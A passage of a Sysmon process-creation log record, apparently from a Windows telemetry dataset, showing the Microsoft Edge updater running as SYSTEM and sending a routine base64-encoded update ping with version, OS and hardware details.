jktMzk4QTIwRjFCQTRBfSIgdmVyc2lvbj0iMS4zLjE4MS41IiBuZXh0dmVyc2lvbj0iIiBsYW5nPSIiIGJyYW5kPSJJTkJYIiBjbGllbnQ9IiIgaW5zdGFsbGFnZT0iOTkiIGNvaG9ydD0icnJmQDAuMTIiPjx1cGRhdGVjaGVjay8-PHBpbmcgcj0iMSIgcmQ9IjYyMDQiIHBpbmdfZnJlc2huZXNzPSJ7NDhBRDk3MTMtMzFGQy00MDFBLThFREUtRUY0MzRDMEUyODE3fSIvPjwvYXBwPjxhcHAgYXBwaWQ9Ins1NkVCMThGOC1CMDA4LTRDQkQtQjZEMi04Qzk3RkU3RTkwNjJ9IiB2ZXJzaW9uPSIxMjAuMC4yMjEwLjkxIiBuZXh0dmVyc2lvbj0iIiBsYW5nPSIiIGJyYW5kPSJJTkJYIiBjbGllbnQ9IiIgZXhwZXJpbWVudHM9ImNvbnNlbnQ9ZmFsc2UiIGNvaG9ydD0icnJmQDAuODgiIG9vYmVfaW5zdGFsbF90aW1lPSIxODQ0Njc0NDA3MzcwOTU1MTYwNiIgdXBkYXRlX2NvdW50PSIzIiBpc19waW5uZWRfc3lzdGVtPSJ0cnVlIiBsYXN0X2xhdW5jaF9jb3VudD0iMSIgbGFzdF9sYXVuY2hfdGltZT0iMTMzNDgxOTQ2NDA1MTA2NTEwIiBmaXJzdF9mcmVfc2Vlbl90aW1lPSIxMzM0ODE5NDI3MDAxNjgwOTAiIGZpcnN0X2ZyZV9zZWVuX3ZlcnNpb249IjExNy4wLjIwNDUuMzUiPjx1cGRhdGVjaGVjay8-PHBpbmcgYWN0aXZlPSIxIiBhPSIxIiByPSIxIiBhZD0iNjIwNCIgcmQ9IjYyMDQiIHBpbmdfZnJlc2huZXNzPSJ7N0QwREI3OTgtMUM1My00MUJDLUEwM0YtN0JBMTk4MjcyNTQ0fSIvPjwvYXBwPjxhcHAgYXBwaWQ9IntGMzAxNzIyNi1GRTJBLTQyOTUtOEJERi0wMEMzQTlBN0U0QzV9IiB2ZXJzaW9uPSIxMjAuMC4yMjEwLjkxIiBuZXh0dmVyc2lvbj0iIiBsYW5nPSIiIGJyYW5kPSJJTkJYIiBjbGllbnQ9IiIgZXhwZXJpbWVudHM9ImNvbnNlbnQ9ZmFsc2UiIGNvaG9ydD0icnJmQDAuMzkiIHVwZGF0ZV9jb3VudD0iMiIgbGFzdF9sYXVuY2hfY291bnQ9IjEiIGxhc3RfbGF1bmNoX3RpbWU9IjEzMzQ4MTk0NDI0NDg1MDgzMCI-PHVwZGF0ZWNoZWNrLz48cGluZyBhY3RpdmU9IjAiIHI9IjEiIHJkPSI2MjA0IiBwaW5nX2ZyZXNobmVzcz0ie0M2MEIzQkFBLTZFN0EtNDVBRS1BNzFDLTE5MjJDNzJFNzNFQX0iLz48L2FwcD48L3JlcXVlc3Q-",Microsoft Corporation,WinDev2309Eval,,C:\Program Files (x86)\Microsoft\EdgeUpdate\1.3.181.5\,Microsoft Edge Update,,,,,,,1,9451,,1.3.155.85,"MD5=A4FC8EC5BC41C41918B0C1541E4E4BE6,SHA256=54545F352215A9C0F370A01980AADCD5749A93589931662D89A974D7BD60F476,IMPHASH=E00D60405A249A05D3B09AA7FE924B17",C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe,,System,0x8000000000000000,Information,{fda94052-34eb-658d-e703-000000000000},0x3e7,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:46:30.494

ProcessGuid: {fda94052-43f6-658d-6302-000000000b00}

ProcessId: 8364

Image: C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe

FileVersion: 1.3.155.85

Description: Microsoft Edge Update

Product: Microsoft Edge Update

Company: Microsoft Corporation

OriginalFileName: msedgeupdate.dll

CommandLine: ""C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe"" /ping PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48cmVxdWVzdCBwcm90b2NvbD0iMy4wIiB1cGRhdGVyPSJPbWFoYSIgdXBkYXRlcnZlcnNpb249IjEuMy4xODEuNSIgc2hlbGxfdmVyc2lvbj0iMS4zLjE1NS44NSIgaXNtYWNoaW5lPSIxIiBzZXNzaW9uaWQ9IntDRjMyQ0M0Ri0wMDM1LTRDQkUtODc2NC00OUJGMUI0MkMxRTB9IiB1c2VyaWQ9Ins5RDcyOUUxMS02MDJBLTRCNzktOTg2NS0xOEY2QzA4MUZFNjl9IiBpbnN0YWxsc291cmNlPSJzY2hlZHVsZXIiIHJlcXVlc3RpZD0ie0U0MzIzQTU1LTNCOTUtNEJFNC1BODlBLTIyM0REOEI2NzVFOX0iIGRlZHVwPSJjciIgZG9tYWluam9pbmVkPSIwIj48aHcgbG9naWNhbF9jcHVzPSI0IiBwaHlzbWVtb3J5PSI4IiBkaXNrX3R5cGU9IjIiIHNzZT0iMSIgc3NlMj0iMSIgc3NlMz0iMSIgc3NzZTM9IjEiIHNzZTQxPSIxIiBzc2U0Mj0iMSIgYXZ4PSIxIi8-PG9zIHBsYXRmb3JtPSJ3aW4iIHZlcnNpb249IjEwLjAuMjI2MjEuMjI4MyIgc3A9IiIgYXJjaD0ieDY0IiBwcm9kdWN0X3R5cGU9IjcyIiBvc19yZWdpb25fbmFtZT0iVVMiIG9zX3JlZ2lvbl9uYXRpb249IjI0NCIgb3NfcmVnaW9uX2RtYT0iMCIgaXNfd2lwPSIwIiBpc19pbl9sb2NrZG93bl9tb2RlPSIwIi8-PG9lbSBwcm9kdWN0X21hbnVmYWN0dXJlcj0iVk13YXJlLCBJbmMuIiBwcm9kdWN0X25hbWU9IlZNd2FyZTcsMSIvPjxleHAgZXRhZz0iJnF1b3Q7cjQ1MnQxK2syVGdxL0hYemp2Rk5CUmhvcEJXUjlzYmpYeHFlVURIOXVYMD0mcXVvdDsiLz48YXBwIGFwcGlkPSJ7RjNDNEZFMDAtRUZENS00MDNCLTk1NjktMzk4QTIwRjFCQTRBfSIgdmVyc2lvbj0iMS4zLjE4MS41IiBuZXh0dmVyc2lvbj0iIiBsYW5nPSIiIGJyYW5kPSJJTkJYIiBjbGllbnQ9IiIgaW5zdGFsbGFnZT0iOTkiIGNvaG9ydD0icnJmQDAuMTIiPjx1cGRhdGVjaGVjay8-PHBpbmcgcj0iMSIgcmQ9IjYyMDQiIHBpbmdfZnJlc2huZXNzPSJ7NDhBRDk3MTMtMzFGQy00MDFBLThFREUtRUY0MzRDMEUyODE3fSIvPjwvYXBwPjxhcHAgYXBwaWQ9Ins1NkVCMThGOC1CMDA4LTRDQkQtQjZEMi04Qzk3RkU3RTkwNjJ9IiB2ZXJzaW9uPSIxMjAuMC4yMjEwLjkxIiBuZXh0dmVyc2lvbj0iIiBsYW5nPSIiIGJyYW5kPSJJTkJYIiBjbGllbnQ9IiIgZXhwZXJpbWVudHM9ImNvbnNlbnQ9ZmFsc2UiIGNvaG9ydD0icnJmQDAuODgiIG9vYmVfaW5zdGFsbF90aW1lPSIxODQ0Njc0NDA3MzcwOTU1MTYwNiIgdXBkYXRlX2NvdW50PSIzIiBpc19waW5uZWRfc3lzdGVtPSJ0cnVlIiBsYXN0X2xhdW5jaF9jb3VudD0iMSIgbGFzdF9sYXVuY2hfdGltZT0iMTMzNDgxOTQ2NDA1MTA2NTEwIiBmaXJzdF9mcmVfc2Vlbl90aW1lPSIxMzM0ODE5NDI3MDAxNjgwOTAiIGZpcnN0X2ZyZV9zZWVuX3ZlcnNpb249IjExNy4wLjIwNDUuMzUiPjx1cGRhdGVjaGVjay8-PHBpbmcgYWN0aXZlPSIxIiBhPSIxIiByPSIxIiBhZD0iNjIwNCIgcmQ9IjYyMDQiIHBpbmdfZnJlc2huZXNzPSJ7N0QwREI3OTgtMUM1My00MUJDLUEwM0YtN0JBMTk4MjcyNTQ0fSIvPjwvYXBwPjxhcHAgYXBwaWQ9IntGMzAxNzIyNi1GRTJBLTQyOTUtOEJERi0wMEMzQTlBN0U0QzV9IiB2ZXJzaW9uPSIxMjAuMC4yMjEwLjkxIiBuZXh0dmVyc2lvbj0iIiBsYW5nPSIiIGJyYW5kPSJJTkJYIiBjbGllbnQ9IiIgZXhwZXJpbWVudHM9ImNvbnNlbnQ9ZmFsc2UiIGNvaG9ydD0icnJmQDAuMzkiIHVwZGF0ZV9jb3VudD0iMiIgbGFzdF9sYXVuY2hfY291bnQ9IjEiIGxhc3RfbGF1bmNoX3RpbWU9IjEzMzQ4MTk0NDI0NDg1MDgzMCI-PHVwZGF0ZWNoZWNrLz48cGluZyBhY3RpdmU9IjAiIHI9IjEiIHJkPSI2MjA0IiBwaW5nX2ZyZXNobmVzcz0ie0M2MEIzQkFBLTZFN0EtNDVBRS1BNzFDLTE5MjJDNzJFNzNFQX0iLz48L2FwcD48L3JlcXVlc3Q-

CurrentDirectory: C:\Program Files (x86)\Microsoft\EdgeUpdate\1.3.181.5\

User: NT AUTHORITY\SYSTEM

LogonGuid: {fda94052-34eb-658d-e703-000000000000}

LogonId: 0x3E7

TerminalSessionId: 0

IntegrityLevel: System

Hashes: MD5=A4FC8EC5BC41C41918B0C1541E4E4BE6,SHA256=54545F352215A9C0F370A01980AADCD5749A93589931662D89A974D7BD60F476,IMPHASH=E00D60405A249A05D3B09AA7FE924B17

ParentProcessGuid: {fda94052-43f5-658d-6102-000000000b00}

ParentProcessId: 3852

ParentImage: C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe

ParentCommandLine: ""C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe"" /svc

ParentUser: NT AUTHORITY\SYSTEM",Info,msedgeupdate.dll,"""C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe"" /svc",C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe,{fda94052-43f5-658d-6102-000000000b00},3852,NT AUTHORITY\SYSTEM,{fda94052-43f6-658d-6302-000000000b00},7044,8364,Microsoft Edge Update,,,,,"
      ",-,,,,,,2023-12-28T09:46:30.4959883Z,,,Process Create (rule: ProcessCreate),0,6672,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-28 09:46:30.494,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:46:30.4959883Z""/>
      <EventRecordID>9451</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:46:30.494</Data>
      <Data Name=""ProcessGuid"">{fda94052-43f6-658d-6302-000000000b00}</Data>
      <Data Name=""ProcessId"">8364</Data>
      <Data Name=""Image"">C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe</Data>
      <Data Name=""FileVersion"">1.3.155.85</Data>
      <Data Name=""Description"">Microsoft Edge Update</Data>
      <Data Name=""Product"">Microsoft Edge Update</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">msedgeupdate.dll</Data>
      <Data Name=""CommandLine"">""C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe"" /ping PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48cmVxdWVzdCBwcm90b2NvbD0iMy4wIiB1cGRhdGVyPSJPbWFoYSIgdXBkYXRlcnZlcnNpb249IjEuMy4xODEuNSIgc2hlbGxfdmVyc2lvbj0iMS4zLjE1NS44NSIgaXNtYWNoaW5lPSIxIiBzZXNzaW9uaWQ9IntDRjMyQ0M0Ri0wMDM1LTRDQkUtODc2NC00OUJGMUI0MkMxRTB9IiB1c2VyaWQ9Ins5RDcyOUUxMS02MDJBLTRCNzktOTg2NS0xOEY2QzA4MUZFNjl9IiBpbnN0YWxsc291cmNlPSJzY2hlZHVsZXIiIHJlcXVlc3RpZD0ie0U0MzIzQTU1LTNCOTUtNEJFNC1BODlBLTIyM0REOEI2NzVFOX0iIGRlZHVwPSJjciIgZG9tYWluam9pbmVkPSIwIj48aHcgbG9naWNhbF9jcHVzPSI0IiBwaHlzbWVtb3J5PSI4IiBkaXNrX3R5cGU9IjIiIHNzZT0iMSIgc3NlMj0iMSIgc3NlMz0iMSIgc3NzZTM9IjEiIHNzZTQxPSIxIiBzc2U0Mj0iMSIgYXZ4PSIxIi8-PG9zIHBsYXRmb3JtPSJ3aW4iIHZlcnNpb249IjEwLjAuMjI2MjEuMjI4MyIgc3A9IiIgYXJjaD0ieDY0IiBwcm9kdWN0X3R5cGU9IjcyIiBvc19yZWdpb25fbmFtZT0iVVMiIG9zX3JlZ2lvbl9uYXRpb249IjI0NCIgb3NfcmVnaW9uX2RtYT0iMCIgaXNfd2lwPSIwIiBpc19pbl9sb2NrZG93bl9tb2RlPSIwIi8-PG9lbSBwcm9kdWN0X21hbnVmYWN0dXJlcj0iVk13YXJlLCBJbmMuIiBwcm9kdWN0X25hbWU9IlZNd2FyZTcsMSIvPjxleHAgZXRhZz0iJnF1b3Q7cjQ1MnQxK2syVGdxL0hYemp2Rk5CUmhvcEJXUjlzYmpYeHFlVURIOXVYMD0mcXVvdDsiLz48YXBwIGFwcGlkPSJ7RjNDNEZFMDAtRUZENS00MDNCLTk1NjktMzk4QTIwRjFCQTRBfSIgdmVyc2lvbj0iMS4zLjE4MS41IiBuZXh0dmVyc2lvbj0iIiBsYW5nPSIiIGJyYW5kPSJJTkJYIiBjbGllbnQ9IiIgaW5zdGFsbGFnZT0iOTkiIGNvaG9ydD0icnJmQDAuMTIiPjx1cGRhdGVjaGVjay8-PHBpbmcgcj0iMSIgcmQ9IjYyMDQiIHBpbmdfZnJlc2huZXNzPSJ7NDhBRDk3MTMtMzFGQy00MDFBLThFREUtRUY0MzRDMEUyODE3fSIvPjwvYXBwPjxhcHAgYXBwaWQ9Ins1NkVCMThGOC1CMDA4LTRDQkQtQjZEMi04Qzk3RkU3RTkwNjJ9IiB2ZXJzaW9uPSIxMjAuMC4yMjEwLjkxIiBuZXh0dmVyc2lvbj0iIiBsYW5nPSIiIGJyYW5kPSJJTkJYIiBjbGllbnQ9IiIgZXhwZXJpbWVudHM9ImNvbnNlbnQ9ZmFsc2UiIGNvaG9ydD0icnJmQDAuODgiIG9vYmVfaW5zdGFsbF90aW1lPSIxODQ0Njc0NDA3MzcwOTU1MTYwNiIgdXBkYXRlX2NvdW50PSIzIiBpc19waW5uZWRfc3lzdGVtPSJ0cnVlIiBsYXN0X2xhdW5jaF9jb3VudD0iMSIgbGFzdF9sYXVuY2hfdGltZT0iMTMzNDgxOTQ2NDA1MTA2NTEwIiBmaXJzdF9mcmVfc2Vlbl90aW1lPSIxMzM0ODE5NDI3MDAxNjgwOTAiIGZpcnN0X2ZyZV9zZWVuX3ZlcnNpb249IjExNy4wLjIwNDUuMzUiPjx1cGRhdGVjaGVjay8-PHBpbmcgYWN0aXZlPSIxIiBhPSIxIiByPSIxIiBhZD0iNjIwNCIgcmQ9IjYyMDQiIHBpbmdfZnJlc2huZXNzPSJ7N0QwREI3OTgtMUM1My00MUJDLUEwM0YtN0JBMTk4MjcyNTQ0fSIvPjwvYXBwPjxhcHAgYXBwaWQ9IntGMzAxNzIyNi1GRTJBLTQyOTUtOEJERi0wMEMzQTlBN0U0QzV9IiB2ZXJzaW9uPSIxMjAuMC4yMjEwLjkxIiBuZXh0dmVyc2lvbj0iIiBsYW5nPSIiIGJyYW5kPSJJTkJYIiBjbGllbnQ9IiIgZXhwZXJpbWVudHM9ImNvbnNlbnQ9ZmFsc2UiIGNvaG9ydD0icnJmQDAuMzkiIHVwZGF0ZV9jb3VudD0iMiIgbGFzdF9sYXVuY2hfY291bnQ9IjEiIGxhc3RfbGF1bmNoX3RpbWU9IjEzMzQ4MTk0NDI0NDg1MDgzMCI-PHVwZGF0ZWNoZWNrLz48cGluZyBhY3RpdmU9IjAiIHI9IjEiIHJkPSI2MjA0IiBwaW5nX2ZyZXNobmVzcz0ie0M2MEIzQkFBLTZFN0EtNDVBRS1BNzFDLTE5MjJDNzJFNzNFQX0iLz48L2FwcD48L3JlcXVlc3Q-</Data>
      <Data Name=""CurrentDirectory"">C:\Program Files (x86)\Microsoft\EdgeUpdate\1.3.181.5\</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
      <Data Name=""LogonGuid"">{fda94052-34eb-658d-e703-000000000000}</Data>
      <Data Name=""LogonId"">0x3e7</Data>
      <Data Name=""TerminalSessionId"">0</Data>
      <Data Name=""IntegrityLevel"">System</Data>
      <Data Name=""Hashes"">MD5=A4FC8EC5BC41C41918B0C1541E4E4BE6,SHA256=54545F352215A9C0F370A01980AADCD5749A93589931662D89A974D7BD60F476,IMPHASH=E00D60405A249A05D3B09AA7FE924B17</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-43f5-658d-6102-000000000b00}</Data>
      <Data Name=""ParentProcessId"">3852</Data>
      <Data Name=""ParentImage"">C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe"" /svc</Data>
      <Data Name=""ParentUser"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:46:30.494

ProcessGuid: {fda94052-43f6-658d-6302-000000000b00}

ProcessId: 8364

Image: C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe

FileVersion: 1.3.155.85

Description: Microsoft Edge Update

Product: Microsoft Edge Update

Company: Microsoft Corporation

OriginalFileName: msedgeupdate.dll

CommandLine: ""C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe"" /ping PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48cmVxdWVzdCBwcm90b2NvbD0iMy4wIiB1cGRhdGVyPSJPbWFoYSIgdXBkYXRlcnZlcnNpb249IjEuMy4xODEuNSIgc2hlbGxfdmVyc2lvbj0iMS4zLjE1NS44NSIgaXNtYWNoaW5lPSIxIiBzZXNzaW9uaWQ9IntDRjMyQ0M0Ri0wMDM1LTRDQkUtODc2NC00OUJGMUI0MkMxRTB9IiB1c2VyaWQ9Ins5RDcyOUUxMS02MDJBLTRCNzktOTg2NS0xOEY2QzA4MUZFNjl9IiBpbnN0YWxsc291cmNlPSJzY2hlZHVsZXIiIHJlcXVlc3RpZD0ie0U0MzIzQTU1LTNCOTUtNEJFNC1BODlBLTIyM0REOEI2NzVFOX0iIGRlZHVwPSJjciIgZG9tYWluam9pbmVkPSIwIj48aHcgbG9naWNhbF9jcHVzPSI0IiBwaHlzbWVtb3J5PSI4IiBkaXNrX3R5cGU9IjIiIHNzZT0iMSIgc3NlMj0iMSIgc3NlMz0iMSIgc3NzZTM9IjEiIHNzZTQxPSIxIiBzc2U0Mj0iMSIgYXZ4PSIxIi8-PG9zIHBsYXRmb3JtPSJ3aW4iIHZlcnNpb249IjEwLjAuMjI2MjEuMjI4MyIgc3A9IiIgYXJjaD0ieDY0IiBwcm9kdWN0X3R5cGU9IjcyIiBvc19yZWdpb25fbmFtZT0iVVMiIG9zX3JlZ2lvbl9uYXRpb249IjI0NCIgb3NfcmVnaW9uX2RtYT0iMCIgaXNfd2lwPSIwIiBpc19pbl9sb2NrZG93bl9tb2RlPSIwIi8-PG9lbSBwcm9kdWN0X21hbnVmYWN0dXJlcj0iVk13YXJlLCBJbmMuIiBwcm9kdWN0X25hbWU9IlZNd2FyZTcsMSIvPjxleHAgZXRhZz0iJnF1b3Q7cjQ1MnQxK2syVGdxL0hYemp2Rk5CUmhvcEJXUjlzYmpYeHFlVURIOXVYMD0mcXVvdDsiLz48YXBwIGFwcGlkPSJ7RjNDNEZFMDAtRUZENS00MDNCLTk1NjktMzk4QTIwRjFCQTRBfSIgdmVyc2lvbj0iMS4zLjE4MS41IiBuZXh0dmVyc2lvbj0iIiBsYW5nPSIiIGJyYW5kPSJJTkJYIiBjbGllbnQ9IiIgaW5zdGFsbGFnZT0iOTkiIGNvaG9ydD0icnJmQDAuMTIiPjx1cGRhdGVjaGVjay8-PHBpbmcgcj0iMSIgcmQ9IjYyMDQiIHBpbmdfZnJlc2huZXNzPSJ7NDhBRDk3MTMtMzFGQy00MDFBLThFREUtRUY0MzRDMEUyODE3fSIvPjwvYXBwPjxhcHAgYXBwaWQ9Ins1NkVCMThGOC1CMDA4LTRDQkQtQjZEMi04Qzk3RkU3RTkwNjJ9IiB2ZXJzaW9uPSIxMjAuMC4yMjEwLjkxIiBuZXh0dmVyc2lvbj0iIiBsYW5nPSIiIGJyYW5kPSJJTkJYIiBjbGllbnQ9IiIgZXhwZXJpbWVudHM9ImNvbnNlbnQ9ZmFsc2UiIGNvaG9ydD0icnJmQDAuODgiIG9vYmVfaW5zdGFsbF90aW1lPSIxODQ0Njc0NDA3MzcwOTU1MTYwNiIgdXBkYXRlX2NvdW50PSIzIiBpc19waW5uZWRfc3lzdGVtPSJ0cnVlIiBsYXN0X2xhdW5jaF9jb3VudD0iMSIgbGFzdF9sYXVuY2hfdGltZT0iMTMzNDgxOTQ2NDA1MTA2NTEwIiBmaXJzdF9mcmVfc2Vlbl90aW1lPSIxMzM0ODE5NDI3MDAxNjgwOTAiIGZpcnN0X2ZyZV9zZWVuX3ZlcnNpb249IjExNy4wLjIwNDUuMzUiPjx1cGRhdGVjaGVjay8-PHBpbmcgYWN0aXZlPSIxIiBhPSIxIiByPSIxIiBhZD0iNjIwNCIgcmQ9IjYyMDQiIHBpbmdfZnJlc2huZXNzPSJ7N0QwREI3OTgtMUM1My00MUJDLUEwM0YtN0JBMTk4MjcyNTQ0fSIvPjwvYXBwPjxhcHAgYXBwaWQ9IntGMzAxNzIyNi1GRTJBLTQyOTUtOEJERi0wMEMzQTlBN0U0QzV9IiB2ZXJzaW9uPSIxMjAuMC4yMjEwLjkxIiBuZXh0dmVyc2lvbj0iIiBsYW5nPSIiIGJyYW5kPSJJTkJYIiBjbGllbnQ9IiIgZXhwZXJpbWVudHM9ImNvbnNlbnQ9ZmFsc2UiIGNvaG9ydD0icnJmQDAuMzkiIHVwZGF0ZV9jb3VudD0iMiIgbGFzdF9sYXVuY2hfY291bnQ9IjEiIGxhc3RfbGF1bmNoX3RpbWU9IjEzMzQ4MTk0NDI0NDg1MDgzMCI-PHVwZGF0ZWNoZWNrLz48cGluZyBhY3RpdmU9IjAiIHI9IjEiIHJkPSI2MjA0IiBwaW5nX2ZyZXNobmVzcz0ie0M2MEIzQkFBLTZFN0EtNDVBRS1BNzFDLTE5MjJDNzJFNzNFQX0iLz48L2FwcD48L3JlcXVlc3Q-

CurrentDirectory: C:\Program Files (x86)\Microsoft\EdgeUpdate\1.3.181.5\

User: NT AUTHORITY\SYSTEM

LogonGuid: {fda94052-34eb-658d-e703-000000000000}

LogonId: 0x3E7

TerminalSessionId: 0

IntegrityLevel: System

Hashes: MD5=A4FC8EC5BC41C41918B0C1541E4E4BE6,SHA256=54545F352215A9C0F370A01980AADCD5749A93589931662D89A974D7BD60F476,IMPHASH=E00D60405A249A05D3B09AA7FE924B17

ParentProcessGuid: {fda94052-43f5-658d-6102-000000000b00}

ParentProcessId: 3852

ParentImage: C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe

ParentCommandLine: ""C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe"" /svc

ParentUser: NT AUTHORITY\SYSTEM</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
